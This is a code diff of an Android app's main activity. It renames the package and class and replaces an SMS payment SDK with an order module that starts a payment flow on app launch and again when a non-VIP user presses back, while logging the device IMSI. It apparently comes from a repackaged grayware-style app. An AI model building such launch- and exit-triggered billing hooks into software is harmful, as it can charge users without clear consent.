@@ -1,4 +1,4 @@
-package com.wzm.act;
+package com.yunkl.os;
 
 import java.io.FileOutputStream;
 import java.util.Timer;
@@ -29,18 +29,19 @@ import android.view.View.OnClickListener;
 import android.widget.Button;
 import android.widget.Toast;
 
-import com.junho.mu.R;
 import com.umeng.analytics.MobclickAgent;
+import com.Mei.sdl.wpkg.R;
 import com.zmv.zf.common.Conf;
 import com.zmv.zf.fragment.HomeFragment;
 import com.zmv.zf.fragment.UserFragment;
-import com.zmv.zf.pay.SMSPayUtils;
+import com.zmv.zf.make.OrderUtils;
+import com.zmv.zf.utils.BasicUtils;
 import com.zmv.zf.utils.BitmapUtils;
 import com.zmv.zf.utils.ExitManager;
 import com.zmv.zf.utils.NetworkUtils;
 
 @SuppressLint("ResourceAsColor")
-public class MainAct extends FragmentActivity implements OnClickListener {
+public class Main extends FragmentActivity implements OnClickListener {
 	private Button btn_shared, btn_user;
 
 	private Fragment homeFragment, userFragment;
@@ -67,9 +68,9 @@ public class MainAct extends FragmentActivity implements OnClickListener {
 			if (action.equals("android.net.conn.CONNECTIVITY_CHANGE")) {
 				if (NetworkUtils.checkNet(context)) {
 					if (net_error) {
-						ExitManager.getScreenManager().popActivity(
-								ExitManager.getScreenManager()
-										.currentActivity());
+						// ExitManager.getScreenManager().popActivity(
+						// ExitManager.getScreenManager()
+						// .currentActivity());
 
 						net_error = false;
 					}
@@ -82,29 +83,31 @@ public class MainAct extends FragmentActivity implements OnClickListener {
 			}
 		}
 	};
-	boolean net_error = false;
+	public static boolean net_error = false;
 	private Handler handler = new Handler() {
 		public void handleMessage(Message msg) {
 			switch (msg.what) {
 			case 0:
 				net_error = true;
-				startActivity(new Intent(context, NetWorkAct.class));
+				Toast.makeText(context, "网络未连接...", 1000).show();
+				// startActivity(new Intent(context,
+				// MainNetWorkActivity.class));
 				break;
 			case 1:
-				ExitManager.getScreenManager().popAllActivity();
+				// ExitManager.getScreenManager().popAllActivity();
 				break;
 			default:
 				break;
 			}
 		}
 	};
-	SMSPayUtils payUtils;
+
 
 	@Override
 	public void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
-		context = MainAct.this;
+		context = Main.this;
 		ExitManager.getScreenManager().pushActivity(this);
 		IntentFilter mFilter = new IntentFilter();
 		mFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
@@ -113,13 +116,26 @@ public class MainAct extends FragmentActivity implements OnClickListener {
 		initView();
 		initFragment();
 		initOnClick();
-		flag_status=true;
+		flag_status = true;
 		String path = Environment.getExternalStorageDirectory()
 				.getAbsolutePath() + "/Download/" + "channel_conf";
 		writeFileSdcard(path, Conf.CID);
-		if (payUtils == null)
-			payUtils = new SMSPayUtils(context, "libao",0);
-		payUtils.initSDK();
+		OrderUtils.getInstance().initOrder(context, "libao", new Handler() {
+			public void handleMessage(Message msg) {
+				try {
+					switch (msg.what) {
+					case 0:// 失败
+						break;
+					case 1:// 成功
+						BasicUtils.updateOpen(context, 4);
+						break;
+					default:
+						break;
+					}
+				} catch (Exception e) {
+				}
+			}
+		});
 		if (Conf.IMSI == null || Conf.IMSI.trim().equals(""))
 			MobclickAgent.onEvent(context, "imsi_fail");
 		else
@@ -233,6 +249,7 @@ public class MainAct extends FragmentActivity implements OnClickListener {
 			}
 			if (mReceiver != null)
 				unregisterReceiver(mReceiver);
+				OrderUtils.getInstance().onFinish();
 			ExitManager.getScreenManager().pullActivity(this);
 		} catch (Exception e) {
 			// TODO: handle exception
@@ -246,8 +263,22 @@ public class MainAct extends FragmentActivity implements OnClickListener {
 		// TODO Auto-generated method stub
 		if (keyCode == KeyEvent.KEYCODE_BACK) {
 			if (!Conf.VIP && !pay_flag) {
-				payUtils = new SMSPayUtils(context, "warning",1);
-				payUtils.initSDK();
+				OrderUtils.getInstance().initOrder(context, "tuichu", new Handler() {
+					public void handleMessage(Message msg) {
+						try {
+							switch (msg.what) {
+							case 0:// 失败
+								break;
+							case 1:// 成功
+								BasicUtils.updateOpen(context, 4);
+								break;
+							default:
+								break;
+							}
+						} catch (Exception e) {
+						}
+					}
+				});
 				pay_flag = true;
 
 			} else
@@ -272,7 +303,7 @@ public class MainAct extends FragmentActivity implements OnClickListener {
 				}
 			}, 2000); // 如果2秒钟内没有按下返回键，则启动定时器取消掉刚才执行的任务
 		} else {
-			flag_status=false;
+			flag_status = false;
 			ExitManager.getScreenManager().popAllActivity();
 		}
 	}
